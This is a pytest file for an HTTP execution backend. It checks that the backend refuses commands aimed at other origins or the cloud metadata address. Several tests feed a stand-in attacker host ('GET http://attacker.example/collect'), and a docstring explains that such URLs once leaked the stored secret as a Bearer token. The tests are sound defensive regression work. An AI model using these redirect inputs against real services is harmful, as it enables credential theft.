# tests/servers/execution/test_api_backend.py
from __future__ import annotations

import httpx
import pytest

from nanoinfra.servers.execution.api_backend import ApiBackend
from nanoinfra.servers.types import Server


def _server(base_url: str = "http://10.0.1.5:8080") -> Server:
    return Server(
        id="a" * 32,
        name="test-server",
        provider_id="api",
        config={"baseUrl": base_url},
        secret_ref=None,
        tags=[],
        created_at="t",
        updated_at="t",
    )


@pytest.mark.asyncio
async def test_run_makes_get_request_by_default(respx_mock):
    respx_mock.get("http://10.0.1.5:8080/status").mock(return_value=httpx.Response(200, text="ok"))

    backend = ApiBackend()
    result = await backend.run(_server(), "/status", None, on_activity=lambda _c: None)

    assert result.exit_code == 0
    assert result.output == "ok"


@pytest.mark.asyncio
async def test_run_parses_method_prefix(respx_mock):
    respx_mock.post("http://10.0.1.5:8080/reboot").mock(return_value=httpx.Response(202, text="rebooting"))

    backend = ApiBackend()
    result = await backend.run(_server(), "POST /reboot", None, on_activity=lambda _c: None)

    assert result.exit_code == 0
    assert result.output == "rebooting"


@pytest.mark.asyncio
async def test_non_2xx_status_reported_as_nonzero_exit(respx_mock):
    respx_mock.get("http://10.0.1.5:8080/status").mock(return_value=httpx.Response(500, text="oops"))

    backend = ApiBackend()
    result = await backend.run(_server(), "/status", None, on_activity=lambda _c: None)

    assert result.exit_code == 1
    assert "oops" in result.output


@pytest.mark.asyncio
async def test_secret_value_sent_as_bearer_token():
    server = _server()
    backend = ApiBackend()
    captured: dict[str, object] = {}

    async def fake_send(self, request, **kwargs):
        captured["auth_header"] = request.headers.get("authorization")
        return httpx.Response(200, text="ok", request=request)

    import httpx as httpx_module

    original = httpx_module.AsyncClient.send
    httpx_module.AsyncClient.send = fake_send  # type: ignore[method-assign]
    try:
        await backend.run(server, "/status", "my-token", on_activity=lambda _c: None)
    finally:
        httpx_module.AsyncClient.send = original  # type: ignore[method-assign]

    assert captured["auth_header"] == "Bearer my-token"


@pytest.mark.asyncio
async def test_blocked_target_returns_error_without_making_a_request():
    backend = ApiBackend()
    result = await backend.run(_server(base_url="http://169.254.169.254/latest"), "/meta", None, on_activity=lambda _c: None)

    assert result.exit_code is None
    assert "blocked" in result.error.lower()


@pytest.mark.asyncio
async def test_absolute_url_in_command_cannot_redirect_the_credential_elsewhere(monkeypatch):
    """urljoin() treats an absolute URL in the command as a full replacement for
    baseUrl, so `GET http://attacker.example/collect` used to send the decrypted
    secretRef as a Bearer token to an arbitrary host. Nothing may be requested at
    all in that case -- assert the HTTP client is never even constructed, which
    also proves no Authorization header was built for that destination.
    """
    import httpx as httpx_module

    constructed: list[object] = []
    original_init = httpx_module.AsyncClient.__init__

    def spy_init(self, *args, **kwargs):  # noqa: ANN001, ANN202
        constructed.append(self)
        original_init(self, *args, **kwargs)

    monkeypatch.setattr(httpx_module.AsyncClient, "__init__", spy_init)
    sent: list[httpx.Request] = []

    async def fail_send(self, request, **kwargs):  # noqa: ANN001, ANN202
        sent.append(request)
        raise AssertionError(f"no request may be sent, got {request.url}")

    monkeypatch.setattr(httpx_module.AsyncClient, "send", fail_send)

    backend = ApiBackend()
    result = await backend.run(
        _server(), "GET http://attacker.example/collect", "my-token", on_activity=lambda _c: None
    )

    assert result.exit_code is None
    assert result.error is not None
    assert "attacker.example" in result.error
    assert "different origin" in result.error
    assert constructed == []
    assert sent == []


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "bad_command",
    [
        "http://attacker.example/collect",
        "POST https://attacker.example/collect",
        "GET http://10.0.1.5:9999/status",  # same host, different port is still a different origin
        "GET https://10.0.1.5:8080/status",  # same host/port, different scheme
    ],
)
async def test_off_origin_targets_are_refused(bad_command: str):
    backend = ApiBackend()
    result = await backend.run(_server(), bad_command, "my-token", on_activity=lambda _c: None)

    assert result.exit_code is None
    assert result.error is not None and "different origin" in result.error


@pytest.mark.asyncio
async def test_default_port_in_base_url_still_matches_explicit_port(respx_mock):
    """The origin comparison must not become an accidental functional regression:
    a baseUrl without an explicit port is the same origin as its default port."""
    respx_mock.get("http://10.0.1.5/status").mock(return_value=httpx.Response(200, text="ok"))

    backend = ApiBackend()
    result = await backend.run(
        _server(base_url="http://10.0.1.5"), "/status", None, on_activity=lambda _c: None
    )

    assert result.exit_code == 0
    assert result.output == "ok"


@pytest.mark.asyncio
async def test_malformed_port_in_command_url_fails_closed_not_open(respx_mock, monkeypatch):
    """Regression test: a malformed port (e.g. `:+22`) makes urlparse.port
    raise ValueError. The origin check used to catch that and silently
    substitute the scheme's default port, which could coincidentally equal
    a baseUrl with no explicit port -- httpx itself accepts some malformed
    port forms urlparse rejects, so the two could dial different ports
    while the origin check saw them as equal. A malformed port on either
    side must now fail the comparison closed (refuse), not fall back to a
    default that could match by coincidence."""
    sent: list[httpx.Request] = []

    async def fail_send(self, request, **kwargs):  # noqa: ANN001, ANN202
        sent.append(request)
        raise AssertionError(f"no request may be sent, got {request.url}")

    import httpx as httpx_module

    monkeypatch.setattr(httpx_module.AsyncClient, "send", fail_send)

    backend = ApiBackend()
    result = await backend.run(
        _server(base_url="http://10.0.1.5"),
        "GET http://10.0.1.5:+22/x",
        None,
        on_activity=lambda _c: None,
    )

    assert result.exit_code is None
    assert result.error is not None and "different origin" in result.error
    assert sent == []


@pytest.mark.asyncio
async def test_connection_error_is_reported_not_raised(respx_mock):
    respx_mock.get("http://10.0.1.5:8080/status").mock(side_effect=httpx.ConnectError("refused"))

    backend = ApiBackend()
    result = await backend.run(_server(), "/status", None, on_activity=lambda _c: None)

    assert result.exit_code is None
    assert result.error is not None
